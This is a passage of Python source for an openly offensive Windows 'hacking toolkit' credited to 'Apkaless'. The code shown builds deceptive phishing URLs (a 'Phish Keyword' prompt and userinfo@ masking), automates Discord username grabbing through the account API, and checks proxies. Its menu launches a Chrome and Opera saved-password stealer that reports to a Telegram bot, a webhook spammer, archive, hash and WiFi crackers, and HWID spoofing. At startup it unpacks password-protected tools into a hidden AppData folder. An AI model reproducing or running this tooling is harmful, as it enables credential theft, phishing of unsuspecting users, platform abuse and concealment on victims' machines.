        socks4_prx = Socks4ProxyChecker(proxy, 10).start_checker()
        socks5_prx = Socks5ProxyChecker(proxy, 10).start_checker()

        if http_prx:
            http_proxies.append(proxy)
            save_working(proxy, 'http')
        elif socks4_prx:
            socks4_proxies.append(proxy)
            save_working(proxy, 'socks4')
        elif socks5_prx:
            socks5_proxies.append(proxy)
            save_working(proxy, 'socks5')
        else:
            errors.append(proxy)

    with open(prx_list, 'r') as f:

        proxies = []
        threds = []
        http_proxies = []
        socks4_proxies = []
        socks5_proxies = []
        errors = []

        for prx in f:
            prx = prx.strip('\n')
            proxies.append(prx)

        for proxy in proxies:
            th = Thread(target=check, args=(proxy,))
            th.start()
            threds.append(th)

            print(
                f'\r{green}Http({len(http_proxies)}) :: {cyan}Socks4({len(socks4_proxies)}) :: {lmagenta}Socks5({len(socks5_proxies)}) :: {red}Errors({len(errors)})',
                end='   ')
            

def discordHunter(email, password):
    def internetChecker():
        print('\n[!] Checking Your Connection To The Internet ...\n')
        try:
            cloudscraper.create_scraper().get('https://www.google.com/')
            return 1
        except:
            return 0

    def randomUser():
        letters = string.ascii_letters + string.digits
        username2 = ''.join(random.choice(letters) for _ in range(3)) + ''.join('_')
        username3 = ''.join(random.choice(letters) for _ in range(3)) + ''.join('.')
        username5 = ''.join('_') + ''.join(random.choice(letters) for _ in range(3))
        username6 = ''.join('.') + ''.join(random.choice(letters) for _ in range(3))
        username8 = ''.join(random.choice(letters) for _ in range(2)) + ''.join('_') + ''.join(
            random.choice(letters) for _ in range(1))
        username9 = ''.join(random.choice(letters) for _ in range(2)) + ''.join('.') + ''.join(
            random.choice(letters) for _ in range(1))
        username11 = ''.join(random.choice(letters) for _ in range(1)) + ''.join('_') + ''.join(
            random.choice(letters) for _ in range(2))
        username12 = ''.join(random.choice(letters) for _ in range(1)) + ''.join('.') + ''.join(
            random.choice(letters) for _ in range(2))
        users = [username2, username3, username5, username6, username8, username9, username11, username12]
        return users

    def dominator(email, password):
        os.system('cls')
        with cloudscraper.create_scraper(debug=False) as s:
            login_url = 'https://discord.com/api/v9/auth/login'
            headers = {
                'Accept': '*/*',
                'Content-Type': 'application/json',
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/login',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'X-Fingerprint': '1217540505496453165.T6xcPKVjXPtiJR3NoT8BoojkmJY',
                'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLUdCIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIyLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI3NDM4OCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='
            }
            data = {
                'captcha_key': 'null',
                'login': f"{email}",
                'login_source': 'null',
                'password': f"{password}",
                'undelete': 'false'
            }
            res = s.post(login_url, headers=headers, json=data, timeout=10000)
            try:
                saved_cookies = res.cookies
                token = res.json()['token']
            except:
                print(f'\n{red}[-] Invalid Account Information\n')
                time.sleep(3)
                exit(0)
            print(f'{green}[+] Login Success !\n')
            time.sleep(2)
            os.system('cls')
            counter = 0
            falseUsers = []
            capturedUsers = []
            globalFalse = []
            checkedUsers = []
            ranText = ['You Are A Good Hunter Keep It Up', 'Fire You r BraiN You Bit*h',
                       'Follow Me On Instagram ==> Apkaless',
                       'FBI AND CIA ARE COMING TO UR LOCATION MOVE AWAY RIGHT NOW',
                       'You Got Detected By Discord Security System!!!!!',
                       'I Love When Y O u Use UR Mind',
                       'This is a message from apkaless 2 u son of a good man: dont be bad guy.',
                       'Im From Iraq', 'My Real Name is "S****" Try To Guess My Name :)']
            while True:
                usersList = randomUser()
                try:
                    for username in usersList:

                        if len(globalFalse) > 0:
                            username = globalFalse.pop(0)

                            globalFalse.clear()

                        print(fr'''{cyan}
                ___          __         __              
               /   |  ____  / /______ _/ /__  __________
              / /| | / __ \/ //_/ __ `/ / _ \/ ___/ ___/
             / ___ |/ /_/ / ,< / /_/ / /  __(__  |__  ) 
            /_/  |_/ .___/_/|_|\__,_/_/\___/____/____/  
                  /_/ 

            {yellow}[!] Checking User      : [{white}{username}{yellow}]
            {green}[+] Captured Users     : [{white}{len(capturedUsers)}{green}]
            {red}[-] Unavailable Users  : [{white}{len(falseUsers)}{red}]
            {cyan}[!] Total Checked Users: [{white}{len(checkedUsers)}{cyan}]
            {yellow}[::] {green}{random.choice(ranText)}

                        ''')
                        counter += 1

                        data2 = {
                            'password': f"{password}",
                            'username': f"{username}"
                        }

                        headers2 = {
                            'Accept': '*/*',
                            'Authorization': f'{token}',
                            'Content-Type': 'application/json',
                            'Origin': 'https://discord.com',
                            'Referer': 'https://discord.com/login',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                            'X-Fingerprint': '&',
                            'X-Super-Properties': '&'
                        }

                        user = s.patch('https://discord.com/api/v9/users/@me', headers=headers2, json=data2,
                                       cookies=saved_cookies)
                        if 'code' in user.json():
                            falseUsers.append(username)
                            checkedUsers.append(username)
                            # print(f'\n{counter}) [-] Username Unavailable ===> {username}\n========================\n')
                        elif 'captcha_key' in user.json():
                            # print(f'{counter}) Captured User ===> {username}\n======================')
                            with open('captured.txt', 'a') as f:
                                f.writelines([
                                    f'====================\nCaptured By Apkaless\n====================\nUser: {username}\n====================\nFollow Me On Instagram ===> Apkaless\n====================\n',
                                    '\n'])
                                f.close()
                                capturedUsers.append(username)
                                checkedUsers.append(username)
                        elif 'global' in user.json():
                            # print(f'\n{counter}) Flagged User ===> {username}\n====================\n')
                            globalFalse.append(username)
                            time.sleep(2)
                        os.system('cls')
                except IndexError:
                    continue

    if internetChecker():
        dominator(email, password)
    else:
        print(f'{yellow}[!] You Need To Connect To The Internet In Order To Use This Tool')
        time.sleep(3)

def url_masking():
    init(convert=True)
    version = '1'
    github_url = 'https://github.com/apkaless'
    instagram = 'https://instagram.com/apkaless'
    region = 'IRAQ'
    red = Fore.RED
    green = Fore.GREEN
    yellow = Fore.YELLOW
    white = Fore.WHITE
    cyan = Fore.CYAN
    lw = Fore.LIGHTWHITE_EX
    black = Fore.BLACK
    lr = Fore.LIGHTRED_EX
    lb = Fore.LIGHTBLUE_EX
    lc = Fore.LIGHTCYAN_EX
    lib = Fore.LIGHTBLACK_EX
    res = Fore.RESET



    def validate_url(url):
        url_format = re.compile(r'https?://(www.)?[a-zA-Z0-9-]+\.+[a-zA-Z0-9]+')

        if not re.match(url_format, url):
            raise ValueError('\nInvalid URL format. Please provide a valid web URL.\n')


    def validate_custom_domain(custom_domain):
        domain_format = re.compile(r'[a-zA-Z0-9-]+\.+[a-zA-Z0-9]+')

        if not re.match(domain_format, custom_domain):
            raise ValueError('\nInvalid custom domain. Please provide a valid domain name.\n')


    def validate_keyword(keyword):
        length = 30

        if not isinstance(keyword, str):

            raise TypeError('\nInput must be a string.\n')

        elif ' ' in keyword:
            raise TypeError('\nKeyword Must Not Contain Spaces, Replace Spaces With "-".\n')

        elif len(keyword) > length:
            raise ValueError('\nInput string exceeds the maximum allowed length.\n')

        return True

    def extract_url(html_content: str):

        soup = BeautifulSoup(html_content, 'lxml')

        div = soup.find('div', attrs={'id': 'app'})
        
        return div.a.text

    def short_url(web_url):

        data = {
            'url':f'{web_url}',
            'shorturl':''
        }

        headers = {

            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'

        }

        res = requests.post('https://da.gd/', data=data, headers=headers)
        shorted_url = extract_url(res.text)

        return shorted_url

    def mask_url(custom_domain, keyword, url):
        parsd_url = urlparse(short_url(url))

        masked_url = f'{parsd_url.scheme}://{custom_domain}-{keyword}@{parsd_url.netloc}{parsd_url.path}'

        return masked_url

    def short_url_(url):
            data = {
                'u': url
            }
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
                }
            url = 'https://www.shorturl.at/shortener.php'
            res = requests.post(url, data=data, headers=headers, allow_redirects=False)

            if res.status_code == 200:
                html = res.text
                soup = BeautifulSoup(html, "lxml")
                inputs = soup.find_all('input')
                for element in inputs:
                    if element.attrs['id'] == 'shortenurl':
                        return element['value']
            else:
                print(f'\n{red}[+] Try Again After 5 Minutes\n')
                input('\n')
                sys.exit(1)

    def print_banner():
        os.system('cls')
        print(rf'''{cyan}

    █████╗ ██████╗ ██╗  ██╗ █████╗ ██╗     ███████╗███████╗███████╗
    ██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██║     ██╔════╝██╔════╝██╔════╝
    ███████║██████╔╝█████╔╝ ███████║██║     █████╗  ███████╗███████╗
    ██╔══██║██╔═══╝ ██╔═██╗ ██╔══██║██║     ██╔══╝  ╚════██║╚════██║
    ██║  ██║██║     ██║  ██╗██║  ██║███████╗███████╗███████║███████║
    ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝
                                                                    

    {green}Version     : {lc}{version}
    {green}Github      : {lc}{github_url}
    {green}Instagram   : {lc}{instagram}
    {green}Region      : {lc}{region}        

    ''')

    while True:
            print_banner()
            try:
                url_type = int(input(f"""{cyan}[~] Please Determine The URL Type:\n\n\n\t\t{white}[1] Normal URL {cyan}(ex: https://example.com/)\n\n\t\t{white}[2] Host:Port URL {cyan}(ex: https://example.com:8080)\n\n↳ Select →{white}  """))
                if url_type == 1:
                    url = input(f'{cyan}\n↳ URL To Mask {cyan}→{white}  ')
                    validate_url(url)
                    break
                elif url_type == 2:
                    url = input(f'{cyan}\n↳ URL To Mask {cyan}→{white}  ')
                    validate_url(url)
                    url = short_url_(url)
                    break
                else:
                    print(f'{red}\nPlease Select Option From Above.')
            except Exception as e:
                sleep(1)
                continue
    while True:
        try:
            custom_domain = input(f'{cyan}\n↳ Custom Domain {green}(ex: google.com) {cyan}→{white}  ')
            validate_custom_domain(custom_domain)
            break
        except Exception as e:
            print(red + str(e))
            sleep(2)
            continue

    while True:

        try:

            keyword = input(f'{cyan}\n↳ Phish Keyword {green}(ex: login, free, anything) {cyan}→{white} ')
            validate_keyword(keyword)
            break
        except Exception as e:
            print(red + str(e))
            sleep(2)
            continue

    masked_url = mask_url(custom_domain, keyword, url)
    print(f'\n{green}[~] Original URL →{cyan} {url}')
    print(f'\n{green}[~] Masked URL →{cyan} {masked_url}')
    input('\n\n')

def remove_tools():
    os.chdir(path_to_assistfolder)
    shutil.rmtree('tools')


def main():
    global username, hwid, hash_type
    os.chdir(path_to_assistfolder)
    try:

        while True:

            os.system('cls')                                                         
            print(fr'''{cyan}                                                                                                          
                                          ┏────────────────────────────────────────────────────────────────────────────────────┓
                                          ┃                                                                                    ┃
                                         ┌┘                            {lcyan}Ω Name         ➱  Apkaless{cyan}                              └┐
                                         ┃                             {lcyan}Ω Github       ➱  Https://github.com/apkaless{cyan}            ┃
                                         ┃                             {lcyan}Ω Instagram    ➱  Https://instagram.com/apkaless{cyan}         ┃
                                         ┕┑                            {lcyan}Ω Region       ➱  IRAQ                                  ┌┘
                                          ┃                            {lcyan}Ω Version      ➱  {str(cversion)}                                     ┃
                                          ┖──────────────────────────────────            ──────────────────────────────────────┚
            ┏────────────────────────────────────────────────────────────────            ──────────────────────────────────────────────────────────────────┓               
            ┃ {lcyan}01 IDM Trial Reset                          07 Discord Users Checker                                          15 7z Files Cracker{cyan}            ┃
            ┃ {lcyan}02 Clean Temp Files                         08 Discord Webhook Spammer                                        16 Zip Files Cracker{cyan}           ┃
            ┃ {lcyan}03 Activate Your Windows                    09 Malware (Chrome & Opera Saved Passwords Stealer)               17 WiFi Cracker{cyan}                ┃
            ┃ {lcyan}04 Optimize Your Network                    10 Get Saved Wifi Passwords                                       18 Spoof HWID{cyan}                  ┃
            ┃ {lcyan}05 Get Proxies                              11 Advanced Nmap Commands                                         19 Spoof Disk HWID{cyan}             ┃
            ┃ {lcyan}06 Proxies Checker                          12 Fastest Wordlist Generator                                     20 Get HWID{cyan}                    ┃
            ┃                                             {lcyan}13 Python File Converter (py to exe)                              21 URL Masking{cyan}                 ┃
            ┃                                             {lcyan}14 Hash Cracker                                                   22 IP & Domain Lookup{cyan}          ┃
            ┖──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┚

         ''')

            cmd = input(f'{green}[{green}{str(datetime.now().strftime('%a:%m:%d:%y | %I:%M %p'))}{green}]{lcyan}{green} ➱ {white} ')

            if cmd == '1':
                try:

                    subprocess.check_output('cmd.exe /C start "IDM" tools/IDM_Trial_Reset.exe', shell=True)
                except:
                    continue

            if cmd == '2':
                try:
                    subprocess.check_output('cmd.exe /C start "Cleaner" tools/cleaner.exe', shell=True)
                except:
                    continue

            if cmd == '3':
                subprocess.check_output('cmd.exe /C start "Activation" tools/WindowsActivation.exe', shell=True)

            if cmd == '4':
                try:
                    os.system('cls')
                    subprocess.check_output('cmd.exe /c start "NetOptimizer" tools/Network_Optimizer.exe', shell=True)
                except:
                    continue
            if cmd == '5':
                try:
                    proxy_gen()
                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except:
                    continue

            if cmd == '6':
                try:
                    os.system('cls')
                    prxlistinput = os.path.join(input(f'\n{green}[+] Path To Proxies List To Check:{white} '))
                    proxy_check(prxlistinput)
                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except:
                    continue

            if cmd == '7':
                os.system('cls')
                while True:
                    try:
                        print(f'''{yellow}\n[!] In Order To Use This Tool You Need To Do This:{white}

                                *) Go to https://www.emailnator.com/
                                *) Make Sure The Email Ends With @gmail.com, Click Go
                                *) Go To https://discord.com/register And Create The Account
                                *) Go To https://discord.com/login and Login Into Discord
                                *) Login With Account In This Tool
                                *) Please Keep Your Browser Open and Keep Logged into Discord Website Don\'t Log Out, 
                                    Otherwise This Tool Not Going To Work
                                    ''')
                        webbrowser.open('https://discord.com/login')
                        print(f'{cyan}\n[!] Login Into Discord Using Browser First Then Login Here')

                        emailInput = str(input('\nEmail: '))

                        passwordInput = str(input('\nPassword: '))

                        if emailInput == '':
                            print('\n[!] Email Shouldn\'t Be Empty\n')
                            time.sleep(3)
                            os.system('cls')
                            continue
                        elif passwordInput == '':
                            print('\n[!] Password Shouldn\'t Be Empty\n')
                            time.sleep(3)
                            os.system('cls')
                            continue

                        else:
                            break
                    except KeyboardInterrupt:
                        main()
                th = threading.Thread(target=discordHunter, args=(emailInput, passwordInput))
                th.start()
                th.join()
                main()
            if cmd == '8':
                webhookSpammer()
                input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')

            if cmd == '9':
                os.system('cls')
                try:

                    btoken = input(f'\n{green}[+] Telegram Bot Token:{white} ')
                    cid = input(f'\n{green}[+] Telegram Channel ID:{white} ')
                    malname = input(f'\n{green}[+] Malware Name (*Please Note Mustn\'t Contain Space):{white} ')
                    malico = input(f'\n{green}[+] Icon Path:{white} ')

                    malware(btoken, cid, malname, malico)
                    input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')

                except KeyboardInterrupt:
                    pass

            if cmd == '10':
                wifiPassword()
                input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
            if cmd == '11':
                nmapCommands()
                input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')

            if cmd == '12':
                try:
                    wordlist()
                    input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except KeyboardInterrupt:
                    main()

            if cmd == '13':
                os.system('cls')
                try:
                    appname = input(f'\n{green}[+] Python File Path:{white} ')
                    appico = input(f'\n{green}[+] Icon Path:{white} ')
                    py2exe(appname, appico)
                except KeyboardInterrupt:
                    main()

            if cmd == '14':
                os.system('cls')
                try:
                    print(f'''{yellow}[!] {white}Supported Hash Types:

            {blue}[1] {white}sha256
            {blue}[2] {white}sha1
            {blue}[3] {white}sha224
            {blue}[4] {white}sha384
            {blue}[5] {white}sha512                         
            {blue}[6] {white}md5                        
    ''')
                    try:

                        hash_type = int(input(f'{green}[+] Hash Type:{white} '))
                    except:
                        print(f'\n{red}[-] Hash Type is Invalid !')
                        time.sleep(3)
                        main()
                    os.system('cls')
                    hash = input(f'\n{green}[+] Hash To Crack:{white} ')
                    pwdlistinput = os.path.join(input(f'\n{green}[+] Path To Passwords List To Use:{white} '))
                    hash_cracker(hash, pwdlistinput, hash_type)
                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except KeyboardInterrupt:
                    main()

            if cmd == '15':
                os.system('cls')
                try:
                    zipfinput = os.path.join(input(f'\n{green}[+] Path To 7z File To Crack:{white} '))
                    pwdlistinput = os.path.join(input(f'\n{green}[+] Path To Passwords List To Use:{white} '))
                    sevenz_cracker(zipfinput, pwdlistinput)
                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except KeyboardInterrupt:
                    main()

            if cmd == '16':
                os.system('cls')
                try:
                    zipfinput = os.path.join(input(f'\n{green}[+] Path To Zip File To Crack:{white} '))
                    pwdlistinput = os.path.join(input(f'\n{green}[+] Path To Passwords List To Use:{white} '))

                    if zipfinput and pwdlistinput:

                        zipfilecracker(zipfinput, pwdlistinput)
                    else:
                        main()

                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except KeyboardInterrupt:
                    main()

            if cmd == '17':
                os.system('cls')
                try:
                    pwds = os.path.join(input(f'\n{green}[+] Path To Passwords Dictionary:{white} '))
                    if pwds:

                        crack_wifi(pwds)
                    else:
                        main()
                except KeyboardInterrupt:
                    main()

            if cmd == '18':
                os.system('cls')
                try:
                    mssg = hwid_spoofer()
                    machine_id = machineID_spoofer()
                    if mssg and machine_id:
                        print(f'\n{green}[+] MAC Address Spoofed Successfully.\n')
                        print(f'\n{green}[+] HWIDs Spoofed Successfully.\n')
                        print(f'{green}[+] New HWID is: {get_hwid()}\n')
                        print(f'{yellow}[-] Old HWID is: {hwid}\n')
                    else:
                        print(f'{red}[-] There Was An Error While Spoofing HWIDs.')
                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except KeyboardInterrupt:
                    main()

            if cmd == '19':
                os.chdir(path_to_assistfolder)
                os.chdir('tools')
                os.chdir('diskids')
                mainfile = os.listdir()[0]
                subprocess.check_output(f'start {mainfile}', shell=True)

            if cmd == '20':
                os.system('cls')
                try:
                    hwid = get_hwid()
                    print(f'\n{green}[+] HWID:{white} {hwid}')
                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except KeyboardInterrupt:
                    main()

            if cmd == '21':
                os.system('cls')
                try:
                    url_masking()
                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except KeyboardInterrupt:
                    main()


            if cmd == '22':
                os.system('cls')
                try:

                    ip = input(f'\n{green}[+] IP Address OR Domain Name:{white} ')
                    if ip:
                        ip_lookup(ip)
                    input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                except KeyboardInterrupt:
                    main()


    except KeyboardInterrupt:
        os.system('cls')
        print(f'\n{lmagenta}See You Later {green}Mr.{username}\n')
        time.sleep(3)


if __name__ == '__main__':
    os.system('cls')
    red = Fore.RED
    white = Fore.WHITE
    blue = Fore.BLUE
    green = Fore.GREEN
    yellow = Fore.YELLOW
    lightyellow = Fore.LIGHTYELLOW_EX
    cyan = Fore.CYAN
    lcyan = Fore.LIGHTCYAN_EX
    lmagenta = Fore.LIGHTMAGENTA_EX
    rescolor = Fore.RESET
    cversion = 2
    tool_parent_dir = os.getcwd()
    # tool_parent_dir = os.path.join(tool_parent_dir_1, 'Apkaless')
    username = os.getlogin()
    testfold = f'C:/Users/{username}/AppData/Roaming/'
    path_to_roaming_windows = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows'
    path_to_assistfolder = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/assistfolder'
    zipfile_password = 'apkaless@iraq@2003@sabah@@2003'
    os.chdir(path_to_roaming_windows)
    if os.path.exists('assistfolder'):
        os.chdir('assistfolder')
        if len(os.listdir()) <= 0:
            os.chdir(tool_parent_dir)
            with pyzipper.AESZipFile('tools.zip', mode='r') as f:
                f.extractall(pwd=zipfile_password.encode())
        else:
            pass
    else:
        os.mkdir('assistfolder')
        os.system('attrib /S /D +H assistfolder')
    os.chdir(tool_parent_dir)
    with pyzipper.AESZipFile('tools.zip', mode='r') as f:
        f.extractall(path=path_to_assistfolder, pwd=zipfile_password.encode())

    hwid = get_hwid()
    check_update()
    main()